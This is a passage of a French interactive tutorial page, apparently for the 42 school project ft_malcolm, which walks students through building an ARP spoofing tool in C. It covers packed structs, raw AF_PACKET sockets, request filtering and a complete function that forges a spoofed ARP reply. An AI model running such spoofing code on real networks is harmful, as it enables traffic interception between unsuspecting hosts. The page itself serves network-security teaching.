+    <span class="ty">uint8_t</span>  proto_size; <span class="cm">// offset 5  → OK</span>
+    <span class="ty">uint16_t</span> opcode;     <span class="cm">// offset 6  → OK</span>
+    <span class="ty">uint8_t</span>  smac[6];   <span class="cm">// offset 8  → OK</span>
+    <span class="ty">uint32_t</span> sip;        <span class="cm">// offset 14 → ⚠️  le compilateur peut ajouter 2 octets de padding ici !</span>
+    <span class="ty">uint8_t</span>  tmac[6];   <span class="cm">// décalé → FAUX</span>
+    <span class="ty">uint32_t</span> tip;        <span class="cm">// décalé → FAUX</span>
+};</pre>
+  </div>
+  <div class="tab-pane" id="tab-good">
+    <pre><span class="kw">typedef struct</span> __attribute__((packed)) {
+    <span class="ty">uint16_t</span> hw_type;
+    <span class="ty">uint16_t</span> proto_type;
+    <span class="ty">uint8_t</span>  hw_size;
+    <span class="ty">uint8_t</span>  proto_size;
+    <span class="ty">uint16_t</span> opcode;
+    <span class="ty">uint8_t</span>  sender_mac[6];
+    <span class="ty">uint32_t</span> sender_ip;
+    <span class="ty">uint8_t</span>  target_mac[6];
+    <span class="ty">uint32_t</span> target_ip;
+} <span class="ty">t_arp_pkt</span>; <span class="cm">// sizeof = 28 exactement ✓</span></pre>
+  </div>
+</div>
+
+<div class="section">
+  <h3>🏗️ Les structs à écrire</h3>
+  <p>Tu as besoin de trois structs :</p>
+  <ol>
+    <li><strong>t_eth_hdr</strong> — header Ethernet (14 octets, packed)</li>
+    <li><strong>t_arp_pkt</strong> — payload ARP (28 octets, packed)</li>
+    <li><strong>t_addrs</strong> — tes paramètres parsés (MAC + IP source & target, nom d'interface)</li>
+  </ol>
+  <div class="alert alert-warn">⚠️ <strong>t_addrs</strong> n'est <em>pas</em> packed : c'est une struct de stockage interne, pas un mapping réseau.</div>
+</div>
+
+<div class="exo-box">
+  <h4>✏️ Exercice — Écris le header <code>ft_malcolm.h</code></h4>
+  <p style="font-size:.85rem;color:var(--muted);margin-bottom:12px;">Écris les trois structs, les includes nécessaires, et les prototypes des fonctions principales. Coche ensuite les points ci-dessous.</p>
+  <div class="editor-wrap">
+    <div class="editor-head"><span>ft_malcolm.h</span><span>C</span></div>
+    <textarea class="editor-ta" id="ed-header" placeholder="/* ft_malcolm.h */
+#ifndef FT_MALCOLM_H
+# define FT_MALCOLM_H
+
+// Tes includes ici...
+
+// t_eth_hdr — 14 octets packed
+// t_arp_pkt — 28 octets packed
+// t_addrs   — stockage interne
+
+// Prototypes...
+
+#endif"></textarea>
+  </div>
+  <div class="checklist" id="cl-header">
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label"><code>#include &lt;stdint.h&gt;</code> ou <code>&lt;sys/types.h&gt;</code> pour uint8_t/uint16_t/uint32_t</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label"><code>t_eth_hdr</code> a dst_mac[6], src_mac[6], ethertype — avec <code>__attribute__((packed))</code></div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label"><code>t_arp_pkt</code> a tous les 9 champs ARP dans le bon ordre — avec <code>__attribute__((packed))</code></div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label"><code>t_addrs</code> stocke src_mac, src_ip, target_mac, target_ip, et l'interface</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label"><code>sizeof(t_eth_hdr) == 14</code> et <code>sizeof(t_arp_pkt) == 28</code> (vérifié avec assert ou printf)</div></div>
+  </div>
+  <button class="btn btn-secondary" onclick="checkChecklist('cl-header','unlock1')">Vérifier ma progression →</button>
+  <div id="unlock1" style="display:none;margin-top:14px;">
+    <div class="alert alert-ok">✅ Bonne structure ! Passe à l'étape suivante.</div>
+    <button class="btn btn-success" onclick="unlockStep(2)">Étape 3 — Parsing des arguments →</button>
+  </div>
+</div>`;
+}
+
+function contentStep2() {
+  return `
+<div class="step-badge">ÉTAPE 03 / 07</div>
+<h2 class="step-title">Parsing des arguments</h2>
+<p class="step-desc">ft_malcolm prend 4 arguments : <code>./ft_malcolm [interface] [IP source] [MAC source] [IP target] [MAC target]</code>. Tu dois parser et valider chaque argument avant d'ouvrir le moindre socket.</p>
+
+<div class="section">
+  <h3>📝 Signature attendue</h3>
+  <pre><span class="cm">// Usage: ./ft_malcolm &lt;interface&gt; &lt;IP_source&gt; &lt;MAC_source&gt; &lt;IP_cible&gt; &lt;MAC_cible&gt;</span>
+<span class="cm">// Exemple: ./ft_malcolm eth0 10.0.0.10 BB:BB:BB:BB:BB:BB 10.0.0.5 AA:AA:AA:AA:AA:AA</span>
+<span class="cm">//                         argv[1]  argv[2]       argv[3]           argv[4]     argv[5]</span></pre>
+  <div class="alert alert-info">Le projet 42 utilise souvent l'ordre : source IP, source MAC, target IP, target MAC. Vérifie l'énoncé exact — ici on adopte cet ordre.</div>
+</div>
+
+<div class="section">
+  <h3>🔍 Parser une adresse MAC</h3>
+  <p>Format attendu : <strong>AA:BB:CC:DD:EE:FF</strong> — 6 groupes de 2 hex séparés par des ':'.</p>
+  <div class="tabs">
+    <div class="tab active" onclick="switchTab(this,'mac-sscanf')">sscanf (simple)</div>
+    <div class="tab" onclick="switchTab(this,'mac-manual')">Manuel (plus robuste)</div>
+  </div>
+  <div class="tab-pane active" id="mac-sscanf">
+    <pre><span class="kw">int</span> <span class="fn">parse_mac</span>(<span class="kw">const char</span> *str, <span class="ty">uint8_t</span> mac[6])
+{
+    <span class="kw">unsigned int</span> b[6];
+    <span class="kw">if</span> (<span class="fn">sscanf</span>(str, <span class="st">"%x:%x:%x:%x:%x:%x"</span>,
+            &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6)
+        <span class="kw">return</span> 0;
+    <span class="kw">for</span> (<span class="kw">int</span> i = 0; i < 6; i++)
+    {
+        <span class="kw">if</span> (b[i] > 0xFF) <span class="kw">return</span> 0; <span class="cm">// valeur hors plage</span>
+        mac[i] = (<span class="ty">uint8_t</span>)b[i];
+    }
+    <span class="kw">return</span> 1;
+}</pre>
+  </div>
+  <div class="tab-pane" id="mac-manual">
+    <pre><span class="cm">// Approche manuelle : strtoul() par segment</span>
+<span class="kw">int</span> <span class="fn">parse_mac</span>(<span class="kw">const char</span> *str, <span class="ty">uint8_t</span> mac[6])
+{
+    <span class="kw">char</span> *end;
+    <span class="kw">for</span> (<span class="kw">int</span> i = 0; i < 6; i++)
+    {
+        <span class="kw">unsigned long</span> val = <span class="fn">strtoul</span>(str, &end, 16);
+        <span class="kw">if</span> (val > 0xFF || (i < 5 && *end != <span class="st">':'</span>))
+            <span class="kw">return</span> 0;
+        mac[i] = (<span class="ty">uint8_t</span>)val;
+        str = end + 1;
+    }
+    <span class="kw">return</span> 1;
+}</pre>
+  </div>
+</div>
+
+<div class="section">
+  <h3>🔍 Parser une adresse IP</h3>
+  <pre><span class="pp">#include &lt;arpa/inet.h&gt;</span>
+
+<span class="kw">int</span> <span class="fn">parse_ip</span>(<span class="kw">const char</span> *str, <span class="ty">uint32_t</span> *ip)
+{
+    <span class="kw">struct</span> <span class="ty">in_addr</span> addr;
+    <span class="kw">if</span> (!<span class="fn">inet_aton</span>(str, &addr))
+        <span class="kw">return</span> 0;
+    *ip = addr.s_addr; <span class="cm">// déjà en network byte order (big-endian)</span>
+    <span class="kw">return</span> 1;
+}</pre>
+  <div class="alert alert-warn">⚠️ <code>inet_aton</code> stocke l'IP en <strong>network byte order</strong> (big-endian). C'est ce qu'on veut directement dans notre struct packed. Pas besoin de htonl() supplémentaire.</div>
+</div>
+
+<div class="exo-box">
+  <h4>🧪 Test live — Parsing interactif</h4>
+  <p style="font-size:.85rem;color:var(--muted);margin-bottom:14px;">Tape une adresse MAC ou IP pour voir comment elle est décomposée en octets :</p>
+  <div style="display:flex;flex-direction:column;gap:20px;">
+    <div>
+      <div style="font-size:.8rem;color:var(--muted);margin-bottom:8px;font-family:monospace;">Adresse MAC :</div>
+      <div class="mac-live-wrap">
+        <input class="mac-input-big" id="mac-in" placeholder="AA:BB:CC:DD:EE:FF" maxlength="17" oninput="liveMac(this)">
+        <div class="parsed-bytes" id="mac-bytes">
+          ${[0,1,2,3,4,5].map(i=>`<div class="pbyte" id="mb${i}">--</div>`).join('')}
+        </div>
+        <span id="mac-status" style="font-size:.8rem;"></span>
+      </div>
+    </div>
+    <div>
+      <div style="font-size:.8rem;color:var(--muted);margin-bottom:8px;font-family:monospace;">Adresse IP :</div>
+      <div class="mac-live-wrap">
+        <input class="ip-input-big" id="ip-in" placeholder="10.0.0.5" oninput="liveIP(this)">
+        <div class="ip-bytes" id="ip-bytes">
+          ${[0,1,2,3].map(i=>`<div class="ipbyte" id="ib${i}">--</div>`).join('')}
+        </div>
+        <span id="ip-status" style="font-size:.8rem;"></span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="exo-box">
+  <h4>✏️ Exercice — Écris parse.c</h4>
+  <div class="editor-wrap">
+    <div class="editor-head"><span>parse.c</span><span>C</span></div>
+    <textarea class="editor-ta" id="ed-parse" placeholder="#include &quot;ft_malcolm.h&quot;
+
+// parse_mac: parse &quot;AA:BB:CC:DD:EE:FF&quot; -> uint8_t[6]
+// Retourne 1 si succès, 0 si format invalide
+int parse_mac(const char *str, uint8_t mac[6])
+{
+    // ...
+}
+
+// parse_ip: parse &quot;10.0.0.5&quot; -> uint32_t (network byte order)
+int parse_ip(const char *str, uint32_t *ip)
+{
+    // ...
+}
+
+// parse_args: remplit t_addrs depuis argv
+int parse_args(int argc, char **argv, t_addrs *addrs)
+{
+    // Vérifie argc == 6
+    // Parse argv[1] (interface), argv[2] (src IP), argv[3] (src MAC)
+    //       argv[4] (target IP), argv[5] (target MAC)
+    // Retourne 1 si tout est valide, 0 sinon
+}"></textarea>
+  </div>
+  <div class="checklist" id="cl-parse">
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">parse_mac() valide le format 6 octets hex séparés par ':'</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">parse_ip() utilise inet_aton() ou sscanf, retourne en network byte order</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">parse_args() vérifie argc == 6 et affiche une erreur claire si mauvais usage</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Testé avec valgrind — aucun leak sur chemin d'erreur</div></div>
+  </div>
+  <button class="btn btn-secondary" onclick="checkChecklist('cl-parse','unlock2')">Vérifier →</button>
+  <div id="unlock2" style="display:none;margin-top:14px;">
+    <div class="alert alert-ok">✅ Parsing en place ! Cap sur les sockets.</div>
+    <button class="btn btn-success" onclick="unlockStep(3)">Étape 4 — Réseau bas niveau →</button>
+  </div>
+</div>`;
+}
+
+function contentStep3() {
+  return `
+<div class="step-badge">ÉTAPE 04 / 07</div>
+<h2 class="step-title">Réseau bas niveau</h2>
+<p class="step-desc">C'est ici que le projet devient intéressant. On va ouvrir un socket RAW qui reçoit <em>toutes</em> les trames Ethernet de l'interface, le lier à une interface réseau précise, et préparer la structure d'envoi.</p>
+
+<div class="section">
+  <h3>🔌 Pourquoi AF_PACKET / SOCK_RAW ?</h3>
+  <p>Les sockets classiques (<code>AF_INET</code>, <code>SOCK_DGRAM</code>) opèrent au niveau IP ou UDP. Le kernel gère l'encapsulation Ethernet pour toi. Mais pour ARP, on doit opérer au niveau Ethernet lui-même.</p>
+  <div class="tbl-wrap">
+  <table>
+    <tr><th>Type de socket</th><th>Niveau</th><th>Usage</th></tr>
+    <tr><td class="mono">AF_INET, SOCK_DGRAM</td><td>UDP</td><td>Applications classiques</td></tr>
+    <tr><td class="mono">AF_INET, SOCK_RAW</td><td>IP brut</td><td>ping (ICMP)</td></tr>
+    <tr><td class="mono highlight">AF_PACKET, SOCK_RAW</td><td>Ethernet brut</td><td>ARP, sniffing, ft_malcolm ✓</td></tr>
+  </table>
+  </div>
+  <div class="alert alert-danger">🔒 <code>AF_PACKET</code> nécessite d'être <strong>root</strong> (ou CAP_NET_RAW). Toujours tester avec <code>sudo</code>.</div>
+</div>
+
+<div class="section">
+  <h3>🔧 Les 4 étapes d'initialisation</h3>
+  <pre><span class="pp">#include &lt;sys/socket.h&gt;
+#include &lt;netpacket/packet.h&gt;  </span><span class="cm">// struct sockaddr_ll</span>
+<span class="pp">#include &lt;net/ethernet.h&gt;      </span><span class="cm">// ETH_P_ARP</span>
+<span class="pp">#include &lt;sys/ioctl.h&gt;         </span><span class="cm">// ioctl, SIOCGIFINDEX</span>
+<span class="pp">#include &lt;net/if.h&gt;            </span><span class="cm">// struct ifreq</span>
+
+<span class="cm">// 1. Ouvrir le socket RAW</span>
+<span class="kw">int</span> sock = <span class="fn">socket</span>(AF_PACKET, SOCK_RAW, <span class="fn">htons</span>(ETH_P_ARP));
+<span class="kw">if</span> (sock < 0) { <span class="fn">perror</span>(<span class="st">"socket"</span>); <span class="kw">return</span> -1; }
+
+<span class="cm">// 2. Obtenir l'index de l'interface (ex: "eth0" → 2)</span>
+<span class="kw">struct</span> <span class="ty">ifreq</span> ifr;
+<span class="fn">memset</span>(&ifr, 0, <span class="kw">sizeof</span>(ifr));
+<span class="fn">strncpy</span>(ifr.ifr_name, interface, IFNAMSIZ - 1);
+<span class="kw">if</span> (<span class="fn">ioctl</span>(sock, SIOCGIFINDEX, &ifr) < 0) { <span class="fn">perror</span>(<span class="st">"ioctl"</span>); <span class="kw">return</span> -1; }
+<span class="kw">int</span> ifindex = ifr.ifr_ifindex;
+
+<span class="cm">// 3. Remplir sockaddr_ll pour bind</span>
+<span class="kw">struct</span> <span class="ty">sockaddr_ll</span> sll;
+<span class="fn">memset</span>(&sll, 0, <span class="kw">sizeof</span>(sll));
+sll.sll_family   = AF_PACKET;
+sll.sll_protocol = <span class="fn">htons</span>(ETH_P_ARP);
+sll.sll_ifindex  = ifindex;
+
+<span class="cm">// 4. Lier le socket à l'interface</span>
+<span class="kw">if</span> (<span class="fn">bind</span>(sock, (<span class="kw">struct</span> <span class="ty">sockaddr</span> *)&sll, <span class="kw">sizeof</span>(sll)) < 0)
+    { <span class="fn">perror</span>(<span class="st">"bind"</span>); <span class="kw">return</span> -1; }</pre>
+</div>
+
+<div class="exo-box">
+  <h4>🎯 Exercice — Complète les blancs</h4>
+  <p style="font-size:.85rem;color:var(--muted);margin-bottom:12px;">Retrouve les bons arguments ou valeurs :</p>
+  <div id="blanks-socket">
+    <pre id="blanks-code" style="line-height:2.2;"></pre>
+  </div>
+  <button class="btn btn-secondary" onclick="checkBlanks()">Vérifier les réponses</button>
+  <div id="blanks-result" style="margin-top:10px;"></div>
+</div>
+
+<div class="exo-box">
+  <h4>✏️ Exercice — Écris network.c (init socket)</h4>
+  <div class="editor-wrap">
+    <div class="editor-head"><span>network.c — init_socket()</span><span>C</span></div>
+    <textarea class="editor-ta" id="ed-net" placeholder="#include &quot;ft_malcolm.h&quot;
+
+// Retourne le fd du socket, ou -1 sur erreur
+// Lie le socket à l'interface 'iface'
+// Remplit ifindex dans addrs si nécessaire
+int init_socket(const char *iface, t_addrs *addrs)
+{
+    // 1. socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))
+    // 2. ioctl(sock, SIOCGIFINDEX, &ifr)
+    // 3. bind(sock, ...)
+}"></textarea>
+  </div>
+  <div class="checklist" id="cl-net">
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Utilise AF_PACKET + SOCK_RAW + ETH_P_ARP (pas SOCK_DGRAM, pas AF_INET)</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Utilise ioctl(SIOCGIFINDEX) pour obtenir l'index de l'interface</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">bind() avec sockaddr_ll.sll_ifindex correctement rempli</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Ferme le socket et retourne -1 sur toute erreur</div></div>
+  </div>
+  <button class="btn btn-secondary" onclick="checkChecklist('cl-net','unlock3')">Vérifier →</button>
+  <div id="unlock3" style="display:none;margin-top:14px;">
+    <div class="alert alert-ok">✅ Socket initialisé ! Maintenant on écoute.</div>
+    <button class="btn btn-success" onclick="unlockStep(4)">Étape 5 — Réception filtrée →</button>
+  </div>
+</div>`;
+}
+
+function contentStep4() {
+  return `
+<div class="step-badge">ÉTAPE 05 / 07</div>
+<h2 class="step-title">Réception filtrée</h2>
+<p class="step-desc">Le socket reçoit toutes les trames ARP de l'interface. On doit filtrer pour ne garder que les ARP requests qui demandent l'IP de Source. Tout le reste est ignoré.</p>
+
+<div class="section">
+  <h3>📥 La boucle de réception</h3>
+  <pre><span class="ty">uint8_t</span> buf[42]; <span class="cm">// 14 (Ethernet) + 28 (ARP) = 42 octets minimum</span>
+
+<span class="kw">while</span> (1)
+{
+    <span class="ty">ssize_t</span> n = <span class="fn">recvfrom</span>(sock, buf, <span class="kw">sizeof</span>(buf), 0, NULL, NULL);
+    <span class="kw">if</span> (n < 42)
+        <span class="kw">continue</span>; <span class="cm">// trame trop courte → pas un ARP valide</span>
+
+    <span class="kw">struct</span> <span class="ty">t_eth_hdr</span> *eth = (<span class="kw">struct</span> <span class="ty">t_eth_hdr</span> *)buf;
+    <span class="kw">struct</span> <span class="ty">t_arp_pkt</span> *arp = (<span class="kw">struct</span> <span class="ty">t_arp_pkt</span> *)(buf + 14);
+
+    <span class="cm">// Filtre 1 : c'est bien de l'ARP ?</span>
+    <span class="kw">if</span> (<span class="fn">ntohs</span>(eth->ethertype) != ETH_P_ARP)
+        <span class="kw">continue</span>;
+
+    <span class="cm">// Filtre 2 : c'est une request (opcode = 1) ?</span>
+    <span class="kw">if</span> (<span class="fn">ntohs</span>(arp->opcode) != 1)
+        <span class="kw">continue</span>;
+
+    <span class="cm">// Filtre 3 : la target IP est bien celle de Source ?</span>
+    <span class="kw">if</span> (arp->target_ip != addrs->src_ip)
+        <span class="kw">continue</span>;
+
+    <span class="cm">// Match ! On forge et envoie le reply.</span>
+    <span class="fn">send_arp_reply</span>(sock, arp, addrs);
+    <span class="kw">break</span>; <span class="cm">// ft_malcolm n'envoie qu'un seul reply puis quitte</span>
+}</pre>
+  <div class="alert alert-warn">⚠️ <strong>ntohs()</strong> convertit de network byte order (big-endian) vers host byte order. Sans ça, la comparaison serait fausse sur les architectures little-endian (x86, ARM).</div>
+</div>
+
+<div class="section">
+  <h3>🗺️ Casting de buffer sur struct packed</h3>
+  <p>Le cast <code>(t_eth_hdr *)buf</code> fonctionne parce que la struct est packed et aligne exactement sur les bytes reçus. C'est du <em>type punning</em> — légal ici car on travaille sur <code>uint8_t[]</code>.</p>
+</div>
+
+<div class="exo-box">
+  <h4>🎯 Exercice — Quel paquet passe le filtre ?</h4>
+  <p style="font-size:.85rem;color:var(--muted);margin-bottom:14px;">Notre cible est <strong>src_ip = 10.0.0.10</strong>. Clique sur tous les paquets qui doivent être capturés (peuvent déclencher le reply) :</p>
+  <div class="pkt-cards" id="filter-quiz">
+    ${buildFilterQuiz()}
+  </div>
+  <button class="btn btn-secondary" onclick="checkFilterQuiz()">Vérifier →</button>
+  <div id="filter-result" style="margin-top:10px;"></div>
+</div>
+
+<div class="exo-box">
+  <h4>✏️ Exercice — Écris la boucle de réception dans arp.c</h4>
+  <div class="editor-wrap">
+    <div class="editor-head"><span>arp.c — listen_and_reply()</span><span>C</span></div>
+    <textarea class="editor-ta" id="ed-recv" placeholder="#include &quot;ft_malcolm.h&quot;
+
+void listen_and_reply(int sock, t_addrs *addrs)
+{
+    uint8_t buf[42];
+
+    while (1)
+    {
+        // recvfrom() ...
+        // Caster buf sur t_eth_hdr et t_arp_pkt
+        // Appliquer les 3 filtres
+        // Si match : send_arp_reply() puis break
+    }
+}"></textarea>
+  </div>
+  <div class="checklist" id="cl-recv">
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Buffer de minimum 42 octets (14 + 28)</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Vérifie n >= 42 (trame complète)</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Filtre ethertype == ETH_P_ARP avec ntohs()</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Filtre opcode == 1 (request) avec ntohs()</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Filtre target_ip == addrs->src_ip (déjà en network byte order)</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">break après le reply (ft_malcolm envoie une seule réponse)</div></div>
+  </div>
+  <button class="btn btn-secondary" onclick="checkChecklist('cl-recv','unlock4')">Vérifier →</button>
+  <div id="unlock4" style="display:none;margin-top:14px;">
+    <div class="alert alert-ok">✅ Réception filtrée opérationnelle ! Place à la forge.</div>
+    <button class="btn btn-success" onclick="unlockStep(5)">Étape 6 — Construction du reply →</button>
+  </div>
+</div>`;
+}
+
+function contentStep5() {
+  return `
+<div class="step-badge">ÉTAPE 06 / 07</div>
+<h2 class="step-title">Construction et envoi du reply</h2>
+<p class="step-desc">C'est le cœur de l'attaque. Tu vas construire un paquet ARP reply <em>forgé</em> octet par octet, puis l'envoyer via le socket RAW. Chaque champ doit être précisément correct.</p>
+
+<div class="section">
+  <h3>📦 Ce que doit contenir le reply</h3>
+  <div class="tbl-wrap">
+  <table>
+    <tr><th>Champ</th><th>Valeur dans notre reply</th><th>Pourquoi</th></tr>
+    <tr><td>Eth dst_mac</td><td class="mono highlight">AA:AA:AA:AA:AA:AA</td><td>MAC de Target (destinataire du reply)</td></tr>
+    <tr><td>Eth src_mac</td><td class="mono highlight">BB:BB:BB:BB:BB:BB</td><td>Notre MAC (ou la MAC qu'on usurpe)</td></tr>
+    <tr><td>Eth ethertype</td><td class="mono">0x0806</td><td>ARP</td></tr>
+    <tr><td>ARP hw_type</td><td class="mono">0x0001</td><td>Ethernet</td></tr>
+    <tr><td>ARP proto_type</td><td class="mono">0x0800</td><td>IPv4</td></tr>
+    <tr><td>ARP hw_size</td><td class="mono">6</td><td>Taille MAC</td></tr>
+    <tr><td>ARP proto_size</td><td class="mono">4</td><td>Taille IP</td></tr>
+    <tr><td>ARP opcode</td><td class="mono highlight">0x0002</td><td>Reply !</td></tr>
+    <tr><td>ARP sender_mac</td><td class="mono highlight">BB:BB:BB:BB:BB:BB</td><td>Notre MAC — c'est le mensonge</td></tr>
+    <tr><td>ARP sender_ip</td><td class="mono highlight">10.0.0.10</td><td>IP de Source — on se fait passer pour lui</td></tr>
+    <tr><td>ARP target_mac</td><td class="mono">AA:AA:AA:AA:AA:AA</td><td>MAC de Target (extrait de la request)</td></tr>
+    <tr><td>ARP target_ip</td><td class="mono">10.0.0.5</td><td>IP de Target (extrait de la request)</td></tr>
+  </table>
+  </div>
+</div>
+
+<div class="section">
+  <h3>⚡ Le code de construction</h3>
+  <pre><span class="kw">void</span> <span class="fn">send_arp_reply</span>(<span class="kw">int</span> sock, <span class="ty">t_arp_pkt</span> *req, <span class="ty">t_addrs</span> *addrs)
+{
+    <span class="ty">uint8_t</span> buf[42];
+    <span class="ty">t_eth_hdr</span> *eth = (<span class="ty">t_eth_hdr</span> *)buf;
+    <span class="ty">t_arp_pkt</span> *arp = (<span class="ty">t_arp_pkt</span> *)(buf + 14);
+
+    <span class="cm">/* === Ethernet header === */</span>
+    <span class="fn">memcpy</span>(eth->dst_mac, req->sender_mac, 6);   <span class="cm">// Target reçoit</span>
+    <span class="fn">memcpy</span>(eth->src_mac, addrs->src_mac, 6);    <span class="cm">// On envoie "en tant que" src_mac</span>
+    eth->ethertype = <span class="fn">htons</span>(ETH_P_ARP);
+
+    <span class="cm">/* === ARP payload === */</span>
+    arp->hw_type    = <span class="fn">htons</span>(1);
+    arp->proto_type = <span class="fn">htons</span>(ETH_P_IP);
+    arp->hw_size    = 6;
+    arp->proto_size = 4;
+    arp->opcode     = <span class="fn">htons</span>(2);              <span class="cm">// Reply !</span>
+    <span class="fn">memcpy</span>(arp->sender_mac, addrs->src_mac, 6); <span class="cm">// Notre MAC</span>
+    arp->sender_ip = addrs->src_ip;             <span class="cm">// IP de Source (déjà NBO)</span>
+    <span class="fn">memcpy</span>(arp->target_mac, req->sender_mac, 6);<span class="cm">// MAC de Target</span>
+    arp->target_ip = req->sender_ip;            <span class="cm">// IP de Target</span>
+
+    <span class="cm">/* === Envoi === */</span>
+    <span class="kw">struct</span> <span class="ty">sockaddr_ll</span> sll = {0};
+    sll.sll_family   = AF_PACKET;
+    sll.sll_ifindex  = addrs->ifindex;
+    sll.sll_protocol = <span class="fn">htons</span>(ETH_P_ARP);
+    <span class="fn">sendto</span>(sock, buf, 42, 0,
+           (<span class="kw">struct</span> <span class="ty">sockaddr</span> *)&sll, <span class="kw">sizeof</span>(sll));
+}</pre>
+</div>
+
+<div class="exo-box">
+  <h4>🎯 Exercice — Constructeur de paquet</h4>
+  <p style="font-size:.85rem;color:var(--muted);margin-bottom:14px;">Remplis les champs du reply. Source=10.0.0.10/BB:BB, Target=10.0.0.5/AA:AA :</p>
+  <div class="pkt-builder" id="pkt-builder">
+    <div class="field-row">
+      <label>Eth dst_mac (qui reçoit le reply)</label>
+      <input class="field-input" id="pb-ethdst" placeholder="ex: AA:AA:AA:AA:AA:AA">
+      <div class="field-hint">La MAC de celui qui a posé la question</div>
+    </div>
+    <div class="field-row">
+      <label>Eth src_mac (qui envoie le reply)</label>
+      <input class="field-input" id="pb-ethsrc" placeholder="ex: BB:BB:BB:BB:BB:BB">
+      <div class="field-hint">Notre MAC (celle qu'on usurpe)</div>
+    </div>
+    <div class="field-row">
+      <label>ARP opcode</label>
+      <input class="field-input" id="pb-opcode" placeholder="1 ou 2 ?">
+      <div class="field-hint">Request=1, Reply=2</div>
+    </div>
+    <div class="field-row">
+      <label>ARP sender_mac (le mensonge)</label>
+      <input class="field-input" id="pb-smac" placeholder="?">
+      <div class="field-hint">La MAC qu'on associe à src_ip</div>
+    </div>
+    <div class="field-row">
+      <label>ARP sender_ip (l'IP usurpée)</label>
+      <input class="field-input" id="pb-sip" placeholder="?">
+      <div class="field-hint">L'IP de Source (qu'on prétend être)</div>
+    </div>
+    <div class="field-row">
+      <label>ARP target_mac</label>
+      <input class="field-input" id="pb-tmac" placeholder="?">
+      <div class="field-hint">La MAC du destinataire</div>
+    </div>
+  </div>
+  <button class="btn btn-secondary" onclick="checkPacketBuilder()">Vérifier le paquet</button>
+  <div id="pb-result" style="margin-top:10px;"></div>
+</div>
+
+<div class="exo-box">
+  <h4>✏️ Exercice — Écris send_arp_reply() dans arp.c</h4>
+  <div class="editor-wrap">
+    <div class="editor-head"><span>arp.c — send_arp_reply()</span><span>C</span></div>
+    <textarea class="editor-ta" id="ed-send" placeholder="#include &quot;ft_malcolm.h&quot;
+
+void send_arp_reply(int sock, t_arp_pkt *req, t_addrs *addrs)
+{
+    uint8_t buf[42];
+    t_eth_hdr *eth = (t_eth_hdr *)buf;
+    t_arp_pkt *arp = (t_arp_pkt *)(buf + 14);
+
+    // Remplis eth: dst=MAC_target, src=src_mac, type=ETH_P_ARP
+    // Remplis arp: hw_type, proto_type, hw_size, proto_size,
+    //              opcode=2, sender_mac=src_mac, sender_ip=src_ip,
+    //              target_mac=req->sender_mac, target_ip=req->sender_ip
+    // sendto(sock, buf, 42, ...)
+}"></textarea>
+  </div>
+  <div class="checklist" id="cl-send">
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">eth->dst_mac = MAC de Target (depuis req->sender_mac)</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">eth->src_mac = notre MAC (addrs->src_mac)</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">arp->opcode = htons(2) — reply !</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">arp->sender_mac = notre MAC, arp->sender_ip = notre IP (le mensonge)</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">Tous les uint16_t passent par htons()</div></div>
+    <div class="check-item" onclick="toggleCheck(this)"><div class="check-box">✓</div><div class="check-label">sendto() avec sockaddr_ll.sll_ifindex correctement rempli</div></div>
+  </div>
+  <button class="btn btn-secondary" onclick="checkChecklist('cl-send','unlock5')">Vérifier →</button>
+  <div id="unlock5" style="display:none;margin-top:14px;">
+    <div class="alert alert-ok">🎉 Le cœur du projet est complet ! Plus qu'un bonus.</div>
+    <button class="btn btn-success" onclick="unlockStep(6)">Étape 7 — Bonus →</button>
+  </div>
+</div>`;
+}
+
+function contentStep6() {
+  return `
+<div class="step-badge">ÉTAPE 07 / 07</div>
+<h2 class="step-title">Bonus</h2>
+<p class="step-desc">Le projet de base est complet. Ces extensions enrichissent ton implémentation et montrent ta maîtrise du protocole.</p>
+
+<div class="section">
+  <h3>📢 Verbose mode (-v)</h3>
+  <p>Affiche le contenu de chaque paquet reçu et envoyé, formaté lisiblement.</p>
+  <pre><span class="cm">// Ajoute un flag global ou dans t_addrs</span>
+<span class="kw">int</span>  g_verbose = 0;
+
+<span class="kw">void</span> <span class="fn">print_arp</span>(<span class="kw">const char</span> *label, <span class="ty">t_arp_pkt</span> *arp)
+{
+    <span class="kw">if</span> (!g_verbose) <span class="kw">return</span>;
+    <span class="fn">printf</span>(<span class="st">"\n[%s]\n"</span>, label);
